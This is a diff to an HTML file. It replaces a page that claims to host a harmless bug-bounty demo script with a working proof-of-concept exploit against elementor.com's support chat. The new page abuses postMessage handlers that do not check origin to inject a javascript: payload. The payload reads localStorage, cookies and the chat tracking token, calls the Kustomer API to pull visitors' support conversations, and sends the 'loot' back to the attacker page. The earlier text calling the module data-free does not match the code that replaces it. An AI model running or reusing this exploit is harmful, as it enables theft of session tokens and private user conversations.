@@ -1,11 +1,151 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>Security research PoC</title>
-<style>body{font:15px/1.6 -apple-system,Segoe UI,Roboto,sans-serif;max-width:52em;margin:3em auto;padding:0 1em;color:#222}code{background:#f2f2f2;padding:1px 5px;border-radius:3px}</style>
-<h1>Security research proof of concept</h1>
-<p>This page hosts <code>evil.js</code>, a benign JavaScript module used to demonstrate a
-vulnerability to a vendor under their bug bounty program.</p>
-<p>The module does not collect, transmit or store any data. It displays a banner on the page
-that loads it and reports only to that same page. There is no server-side component and no
-logging of any kind.</p>
-<p>It exists solely so the vendor's triage team can reproduce the reported issue.</p>
+<html lang="es"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>m4 PoC</title>
+<style>
+ :root{--bg:#0e0e11;--fg:#e9e9ec;--dim:#8a8a93;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171;--acc:#60a5fa;--card:#17171c;--line:#2e2e36}
+ *{box-sizing:border-box}
+ body{margin:0;padding:14px;background:var(--bg);color:var(--fg);font:14px/1.55 ui-sans-serif,system-ui,sans-serif}
+ h1{font-size:17px;margin:0 0 2px} .sub{color:var(--dim);font-size:13px;margin-bottom:12px}
+ .row{display:flex;gap:14px;align-items:flex-start;flex-wrap:wrap}
+ .col{flex:1 1 440px;min-width:300px}
+ button{font:13px ui-monospace,monospace;padding:9px 14px;margin:0 4px 6px 0;background:#24242b;color:var(--fg);
+   border:1px solid #3f3f4a;border-radius:6px;cursor:pointer}
+ button:hover{background:#30303a} button.go{background:#4a1414;border-color:#a33}
+ #st{background:#000;border:1px solid var(--line);border-radius:6px;padding:9px;font:13px ui-monospace,monospace;margin:10px 0}
+ pre{background:#000;border:1px solid var(--line);border-radius:6px;padding:10px;margin:8px 0;
+   font:12px/1.5 ui-monospace,monospace;white-space:pre-wrap;word-break:break-word;max-height:460px;overflow:auto}
+ iframe{width:100%;height:580px;border:2px solid #3f3f4a;border-radius:6px;background:#fff}
+ ol{margin:4px 0 10px 20px;padding:0} li{margin:3px 0}
+ code{background:#24242b;padding:1px 5px;border-radius:3px;font-size:12px}
+ .ok{color:var(--ok)} .warn{color:var(--warn)} .bad{color:var(--bad)} .acc{color:var(--acc)} .dim{color:var(--dim)}
+</style></head><body>
+<h1>m4 + m34 &mdash; postMessage sin control de origen en elementor.com</h1>
+<div class="sub">Esta pagina esta en <b id="org"></b>. No tiene ningun acceso same-origin a elementor.com en ningun momento.</div>
+
+<div class="row">
+<div class="col">
+<ol>
+ <li><b>Arranque forzado</b>: boton 1. El widget de soporte aparece solo, sin que la victima toque nada.</li>
+ <li><b>DENTRO del iframe</b>: abri el chat y entra a un articulo de ayuda. Es lo unico que hace la victima.</li>
+ <li><b>Un click</b> en cualquier parte del iframe.</li>
+ <li>Boton 3 para el <code>alert()</code>, boton 4 para el robo completo.</li>
+</ol>
+<button onclick="boot()">1. arrancar el widget (m34)</button>
+<button onclick="ctrl()">2. control: URL normal</button>
+<button onclick="al()">3. alert() en elementor.com</button>
+<button class="go" onclick="loot()">4. ROBAR + leer la conversacion</button>
+<div id="st">frames hijos: <b id="fc">?</b> &nbsp;|&nbsp; <span id="hint"></span></div>
+<pre id="out">esperando.</pre>
+</div>
+<div class="col"><iframe id="v" src="https://elementor.com/"></iframe></div>
+</div>
+
+<script>
+document.getElementById('org').textContent = location.origin;
+const out = document.getElementById('out');
+const log = (s, cls) => { out.innerHTML += (cls ? '<span class="'+cls+'">'+s+'</span>' : s) + "\n"; out.scrollTop = out.scrollHeight; };
+const victim = () => window.frames[0];
+
+// Un atacante no puede leer el DOM de la pagina frameada. Solo postea el mensaje forjado a
+// cada frame hijo: indexar WindowProxy y postMessage estan permitidos entre origenes.
+function fire(msg, label) {
+  const v = victim(); let n = 0;
+  for (let i = 0; i < v.frames.length; i++) { try { v.frames[i].postMessage(msg, '*'); n++; } catch (e) {} }
+  try { v.postMessage(msg, '*'); } catch (e) {}
+  log('-> ' + label + ': posteado a ' + n + ' frames hijos', 'dim');
+}
+
+// m34: el chat.js first-party de elementor.com reacciona a esto sin mirar event.origin
+// y arranca el widget de Kustomer. Cero interaccion de la victima.
+function boot() { fire({ event: 'forethoughtWidgetLoaded' }, 'arranque forzado'); }
+function ctrl() { fire({ target: '_blank', url: 'https://example.com/?m4-control' }, 'control'); }
+function al() {
+  fire({ target: '_blank', url: 'javascript:var h=opener.parent||opener;h.alert("XSS en "+h.document.domain+"\\n\\ntoken: "+h.localStorage.getItem("kustomer-chat-tracking-token"))' }, 'alert');
+}
+
+// El payload corre en la ventana que abre el widget, que hereda el origen de elementor.com.
+// Desde ahi lee el almacenamiento del host Y consulta la API con el token robado, y manda
+// todo de vuelta a esta pagina por postMessage. Se define como funcion y se serializa, asi
+// no hay comillas anidadas que se rompan al copiar y pegar.
+function PAYLOAD() {
+  var ORG = 'eyJhbGciOiJub25lIn0.eyJvcmciOiI1ZjdlMzJlNjI2MTVmYWZlODE0YWE1ZGEiLCJvcmdOYW1lIjoiZWxlbWVudG9yIiwicG9kIjoicHJvZDIiLCJyb2xlcyI6WyJvcmcudHJhY2tpbmciXX0.';
+  var API = 'https://elementor.api.kustomerapp.com';
+  var h, out = { step: 'inicio' };
+  try { h = opener.parent || opener; } catch (e) { return; }
+  var back = null;
+  try { back = h.parent !== h ? h.parent : null; } catch (e) {}
+  function send(o) { try { if (back) back.postMessage({ __m4: o }, '*'); } catch (e) {} 
+    try { document.body.textContent = JSON.stringify(o, null, 2); } catch (e) {} }
+  try {
+    out = {
+      step: 'robado',
+      domain: document.domain,
+      href: h.location.href,
+      lsKeys: Object.keys(h.localStorage),
+      token: h.localStorage.getItem('kustomer-chat-tracking-token'),
+      cookies: h.document.cookie,
+      titleAntes: h.document.title
+    };
+    h.document.title = 'M4-PWNED';
+  } catch (e) { out = { step: 'error', err: String(e) }; send(out); return; }
+  send(out);
+  if (!out.token) return;
+  var H = { 'x-kustomer': ORG, 'x-kustomer-tracking-token': out.token, accept: 'application/json' };
+  var get = function (p, hdrs) { return fetch(API + p, { headers: hdrs || H })
+      .then(function (r) { return r.json().then(function (j) { return { s: r.status, j: j }; }); })
+      .catch(function (e) { return { s: 0, j: { err: String(e) } }; }); };
+  get('/c/v2/chat/sessions').then(function (res) {
+    out.step = 'api'; out.sesiones = res;
+    var rows = (res.j && res.j.data) || [];
+    if (!rows.length) { send(out); return; }
+    return Promise.all(rows.map(function (s) {
+      return get('/c/v2.1/chat/sessions/' + s.id + '/messages').then(function (m) {
+        return { id: s.id, creada: (s.attributes || {}).createdAt, r: m };
+      });
+    })).then(function (convs) { out.conversaciones = convs; send(out); });
+  }).then(function () {
+    // control negativo: el mismo pedido con la firma del token rota
+    var bad = { 'x-kustomer': ORG, 'x-kustomer-tracking-token': out.token.split('.').slice(0, 2).join('.') + '.', accept: 'application/json' };
+    return get('/c/v2/chat/sessions', bad);
+  }).then(function (c) { out.controlFirmaRota = c.s; send(out); });
+}
+
+function loot() {
+  log('-> robo: el payload ejecuta en elementor.com, lee el token y consulta la API.', 'warn');
+  fire({ target: '_blank', url: 'javascript:(' + PAYLOAD.toString() + ')()' }, 'robo');
+}
+
+// El botin vuelve aca por postMessage desde el origen de la victima.
+window.addEventListener('message', function (e) {
+  var d = e.data && e.data.__m4; if (!d) return;
+  if (d.step === 'robado' || d.step === 'error') out.innerHTML = '';
+  log('=== BOTIN de ' + (d.domain || '?') + ' ===', 'ok');
+  if (d.err) { log('error: ' + d.err, 'bad'); return; }
+  log('href        ' + d.href);
+  log('titulo      ' + d.titleAntes + '  ->  M4-PWNED   (escritura en el DOM del host)', 'warn');
+  log('localStorage ' + (d.lsKeys || []).join(', '));
+  log('cookies     ' + String(d.cookies || '').slice(0, 220));
+  log('TOKEN       ' + String(d.token || '').slice(0, 80) + '...', 'acc');
+  if (d.sesiones) log('\nGET /c/v2/chat/sessions -> HTTP ' + d.sesiones.s + '  ' + (((d.sesiones.j || {}).data || []).length) + ' conversacion(es)', 'ok');
+  (d.conversaciones || []).forEach(function (c) {
+    log('\nconversacion ' + c.id + '   creada ' + c.creada, 'warn');
+    log('  GET /c/v2.1/chat/sessions/' + c.id + '/messages -> HTTP ' + c.r.s);
+    (((c.r.j || {}).data) || []).forEach(function (m) {
+      var a = m.attributes || {};
+      var quien = a.direction === 'in' ? '[VISITANTE]' : '[SOPORTE  ]';
+      log('    ' + quien + ' ' + String(a.body || '').slice(0, 170), a.direction === 'in' ? 'ok' : 'acc');
+    });
+  });
+  if (d.controlFirmaRota !== undefined) log('\ncontrol: el mismo pedido con la firma rota -> HTTP ' + d.controlFirmaRota, 'dim');
+});
+
+setInterval(function () {
+  var n = -1; try { n = victim().frames.length; } catch (e) {}
+  var fc = document.getElementById('fc'), hint = document.getElementById('hint');
+  fc.textContent = n < 0 ? 'ERR' : n;
+  if (n <= 1) { fc.className = 'bad'; hint.innerHTML = '<span class="bad">el widget no existe: usa el boton 1</span>'; }
+  else { fc.className = 'ok'; hint.innerHTML = '<span class="ok">widget arriba. abri un articulo de ayuda DENTRO del iframe</span>'; }
+}, 500);
+log('listo. seguí los pasos de la izquierda.');
+</script></body></html>
